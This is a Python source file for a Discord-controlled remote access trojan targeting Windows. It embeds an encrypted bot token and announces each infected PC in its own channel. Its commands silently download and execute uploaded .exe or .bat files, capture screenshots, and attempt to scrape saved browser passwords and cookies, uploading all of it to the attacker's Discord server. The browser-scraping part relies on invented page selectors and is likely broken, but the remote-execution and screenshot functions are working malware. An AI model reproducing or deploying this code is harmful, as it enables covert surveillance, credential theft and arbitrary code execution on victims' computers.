import os
import discord
import subprocess
from discord.ext import commands
from PIL import ImageGrab
import io
import platform
from cryptography.fernet import Fernet
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
import time

# Decrypting the token
key = b"XNVMkRPc1qP4Bq9C_OXAtYWD54rpUtJNpO_PICvFLII="  # Replace with your actual key
cipher_suite = Fernet(key)
encrypted_token = b"gAAAAABouGj2ioU6r5nWwx4MPC42YD4zvPVqYfFYKmRELhCwPu4a4PCam5O7xzVMgY4QdSJSnUgcuVfygaO-M4X__OnuC2Qw7H_hDhqdWXgi4-HRTorljLeo5EGJyMXOQnmc0ktWi9jIFQNKHeheNBEi5UAFY6BrHI9cX4y7YHB10Clk6u-RpG0="  # Replace with your actual encrypted token
TOKEN = cipher_suite.decrypt(encrypted_token).decode()

# Set up the bot
GUILD_ID = 1412825105817538563  # Replace this with your actual Guild ID
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Directory to download files to
DOWNLOAD_DIR = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Discord\\"

# Ensure the download directory exists
if not os.path.exists(DOWNLOAD_DIR):
    os.makedirs(DOWNLOAD_DIR)

# Helper function to create or get the user's channel
async def get_or_create_channel(ctx, user_name):
    guild = bot.get_guild(GUILD_ID)  # Use the specific guild by ID
    # Check if a channel with the name already exists
    channel = discord.utils.get(guild.text_channels, name=user_name.lower())
    if not channel:
        # If the channel doesn't exist, create it
        channel = await guild.create_text_channel(user_name)
    return channel

# Command to handle file sending
@bot.command()
async def send(ctx):
    if len(ctx.message.attachments) > 0:
        attachment = ctx.message.attachments[0]
        file_path = os.path.join(DOWNLOAD_DIR, attachment.filename)

        # Download the file
        await attachment.save(file_path)

        # Now run the downloaded file silently (e.g., .exe, .bat)
        try:
            if file_path.endswith(".bat") or file_path.endswith(".exe"):
                subprocess.run([file_path], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                await ctx.send(f"Executed {attachment.filename} successfully!")
            else:
                await ctx.send(f"Unsupported file type: {attachment.filename}")
        except Exception as e:
            await ctx.send(f"Failed to execute {attachment.filename}: {str(e)}")
    else:
        await ctx.send("No file attached. Please attach a file to send.")

# Command to take a screenshot
@bot.command()
async def screenshot(ctx):
    # Take a screenshot using Pillow
    screenshot = ImageGrab.grab()
    # Save the screenshot to a BytesIO object
    byte_io = io.BytesIO()
    screenshot.save(byte_io, 'PNG')
    byte_io.seek(0)
    await ctx.send("Here is the screenshot:", file=discord.File(byte_io, 'screenshot.png'))

# Command to grab auto-fill passwords and cookies
@bot.command()
async def grab(ctx):
    # List of browsers to check
    browsers = ["chrome", "firefox", "edge"]

    for browser in browsers:
        if browser == "chrome":
            driver_path = "path/to/chromedriver"  # Replace with the actual path to chromedriver
            driver = webdriver.Chrome(executable_path=driver_path)
        elif browser == "firefox":
            driver_path = "path/to/geckodriver"  # Replace with the actual path to geckodriver
            driver = webdriver.Firefox(executable_path=driver_path)
        elif browser == "edge":
            driver_path = "path/to/msedgedriver"  # Replace with the actual path to msedgedriver
            driver = webdriver.Edge(executable_path=driver_path)

        driver.get("chrome://settings/passwords")  # For Chrome; adjust for other browsers
        time.sleep(2)  # Wait for the page to load

        # Extract passwords and cookies
        passwords = []
        cookies = []

        # Example for Chrome; adjust for other browsers
        password_elements = driver.find_elements(By.CSS_SELECTOR, "div.password-item")
        for element in password_elements:
            site = element.find_element(By.CSS_SELECTOR, "div.site").text
            username = element.find_element(By.CSS_SELECTOR, "div.username").text
            password = element.find_element(By.CSS_SELECTOR, "div.password").text
            passwords.append(f"Site: {site}\nUsername: {username}\nPassword: {password}\n")

        cookie_elements = driver.find_elements(By.CSS_SELECTOR, "div.cookie-item")
        for element in cookie_elements:
            site = element.find_element(By.CSS_SELECTOR, "div.site").text
            name = element.find_element(By.CSS_SELECTOR, "div.name").text
            value = element.find_element(By.CSS_SELECTOR, "div.value").text
            cookies.append(f"Site: {site}\nName: {name}\nValue: {value}\n")

        driver.quit()

        # Save passwords and cookies to text files
        with open(os.path.join(DOWNLOAD_DIR, f"{browser}_passwords.txt"), "w") as f:
            f.write("\n".join(passwords))

        with open(os.path.join(DOWNLOAD_DIR, f"{browser}_cookies.txt"), "w") as f:
            f.write("\n".join(cookies))

        # Upload the files to the channel
        await ctx.send(file=discord.File(os.path.join(DOWNLOAD_DIR, f"{browser}_passwords.txt")))
        await ctx.send(file=discord.File(os.path.join(DOWNLOAD_DIR, f"{browser}_cookies.txt")))

# On bot startup: Check and create the channel, ping @everyone in the corresponding channel
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

    # Get the desktop name or username to create the channel
    desktop_name = platform.node()  # This is the name of the PC
    channel_name = desktop_name or os.getlogin()  # Default to the user’s login name if desktop name is not found

    # Fetch the guild (server) by ID and the channel
    guild = bot.get_guild(GUILD_ID)  # Get the specific guild by ID
    if not guild:
        print(f"Guild with ID {GUILD_ID} not found!")
        return

    channel = await get_or_create_channel(guild, channel_name)

    # Send a "ping" message to indicate the bot is online
    await channel.send(f"@everyone The bot is now online and active on {desktop_name}.")

    print(f"Bot is online. Pinged channel: {channel.name}")

# Run the bot
def run_bot():
    print("Starting the bot...")
    bot.run(TOKEN)

if __name__ == "__main__":
    run_bot()
